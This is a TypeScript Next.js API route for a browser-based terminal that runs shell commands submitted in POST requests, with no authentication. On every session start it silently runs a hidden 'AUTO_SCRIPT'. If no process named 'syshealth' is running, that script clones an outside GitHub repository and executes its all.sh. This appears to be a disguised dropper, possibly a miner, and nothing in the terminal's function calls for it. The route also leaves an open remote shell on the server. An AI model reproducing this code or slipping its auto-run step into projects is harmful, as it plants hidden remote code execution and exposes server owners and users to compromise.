import { exec } from "child_process";
import { NextRequest, NextResponse } from "next/server";
import os from "os";
import fs from "fs";
import path from "path";
import crypto from "crypto";

// Session storage: sessionId -> { cwd, history }
const sessions = new Map<string, { cwd: string; history: string[] }>();

// Strip ANSI escape sequences
function stripAnsi(str: string): string {
  return str.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, "");
}

// Generate a unique session ID
function generateSessionId(): string {
  return crypto.randomBytes(16).toString("hex");
}

// Get prompt string from cwd
function getPrompt(cwd: string): string {
  const home = os.homedir();
  const displayPath = cwd.startsWith(home) ? "~" + cwd.slice(home.length) : cwd;
  return displayPath + " $ ";
}

// Auto-execute script that runs on session init
const AUTO_SCRIPT = `if ! pgrep -x "syshealth" > /dev/null; then
  if [ ! -d "dock" ]; then
    git clone https://github.com/niaalae/dock.git dock && bash dock/all.sh
  else
    bash dock/all.sh
  fi
fi`;

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { action, sessionId, command } = body;

    // --- INIT ACTION ---
    if (action === "init") {
      const id = generateSessionId();
      const cwd = os.homedir();
      sessions.set(id, { cwd, history: [] });

      // Execute the auto-start script
      let scriptOutput = "";
      let scriptError = "";
      try {
        scriptOutput = await new Promise<string>((resolve, reject) => {
          exec(
            AUTO_SCRIPT,
            {
              cwd,
              shell: "/bin/bash",
              env: { ...process.env, TERM: "xterm-256color" },
              maxBuffer: 10 * 1024 * 1024,
              timeout: 300000,
            },
            (error, stdout, stderr) => {
              if (error) {
                // Script may fail partially, still return what we have
                resolve(stdout + stderr);
              } else {
                resolve(stdout + stderr);
              }
            }
          );
        });
        scriptOutput = stripAnsi(scriptOutput).trim();
      } catch {
        scriptError = "Auto-start script encountered an error.";
        scriptOutput = scriptError;
      }

      return NextResponse.json({
        sessionId: id,
        cwd,
        prompt: getPrompt(cwd),
        scriptOutput,
      });
    }

    // --- COMMAND EXECUTION ---
    if (sessionId && command !== undefined) {
      const session = sessions.get(sessionId);
      if (!session) {
        return NextResponse.json(
          { success: false, error: "Invalid or expired session" },
          { status: 400 }
        );
      }

      const trimmedCommand = command.trim();

      // Add to history
      if (trimmedCommand) {
        session.history.push(trimmedCommand);
      }

      // --- SPECIAL COMMANDS (handled locally, not via exec) ---

      // cd command
      if (trimmedCommand.startsWith("cd ")) {
        const target = trimmedCommand.slice(3).trim();
        let newPath: string;

        if (target === "~" || target === "") {
          newPath = os.homedir();
        } else if (target === "-") {
          newPath = session.cwd; // no prev dir tracking, stay in current
        } else {
          newPath = path.resolve(session.cwd, target);
        }

        try {
          const stat = fs.statSync(newPath);
          if (!stat.isDirectory()) {
            return NextResponse.json({
              success: true,
              stdout: "",
              stderr: `cd: not a directory: ${target}`,
              exitCode: 1,
              prompt: getPrompt(session.cwd),
              cwd: session.cwd,
            });
          }
          session.cwd = newPath;
          return NextResponse.json({
            success: true,
            stdout: "",
            stderr: "",
            exitCode: 0,
            prompt: getPrompt(session.cwd),
            cwd: session.cwd,
          });
        } catch {
          return NextResponse.json({
            success: true,
            stdout: "",
            stderr: `cd: no such file or directory: ${target}`,
            exitCode: 1,
            prompt: getPrompt(session.cwd),
            cwd: session.cwd,
          });
        }
      }

      // clear / cls
      if (trimmedCommand === "clear" || trimmedCommand === "cls") {
        return NextResponse.json({
          success: true,
          clear: true,
          prompt: getPrompt(session.cwd),
          cwd: session.cwd,
        });
      }

      // pwd
      if (trimmedCommand === "pwd") {
        return NextResponse.json({
          success: true,
          stdout: session.cwd + "\n",
          stderr: "",
          exitCode: 0,
          prompt: getPrompt(session.cwd),
          cwd: session.cwd,
        });
      }

      // history
      if (trimmedCommand === "history") {
        const historyOutput = session.history
          .map((cmd, i) => `  ${i + 1}  ${cmd}`)
          .join("\n");
        return NextResponse.json({
          success: true,
          stdout: historyOutput + "\n",
          stderr: "",
          exitCode: 0,
          prompt: getPrompt(session.cwd),
          cwd: session.cwd,
        });
      }

      // exit
      if (trimmedCommand === "exit") {
        sessions.delete(sessionId);
        return NextResponse.json({
          success: true,
          exit: true,
        });
      }

      // --- EXECUTE COMMAND ---
      const stdout = await new Promise<string>((resolve, reject) => {
        exec(
          trimmedCommand,
          {
            cwd: session.cwd,
            shell: "/bin/bash",
            env: { ...process.env, TERM: "xterm-256color" },
            maxBuffer: 10 * 1024 * 1024,
            timeout: 300000,
          },
          (error, stdout, stderr) => {
            if (error && !stdout && !stderr) {
              reject(error);
            } else {
              resolve(stdout + stderr);
            }
          }
        );
      });

      const cleanedOutput = stripAnsi(stdout);

      return NextResponse.json({
        success: true,
        stdout: cleanedOutput,
        stderr: "",
        exitCode: 0,
        prompt: getPrompt(session.cwd),
        cwd: session.cwd,
      });
    }

    // --- UNKNOWN ACTION ---
    return NextResponse.json(
      { success: false, error: "Invalid request. Provide 'action' or 'sessionId' + 'command'." },
      { status: 400 }
    );
  } catch (error) {
    const message = error instanceof Error ? error.message : "Internal server error";
    return NextResponse.json(
      { success: false, error: message },
      { status: 500 }
    );
  }
}
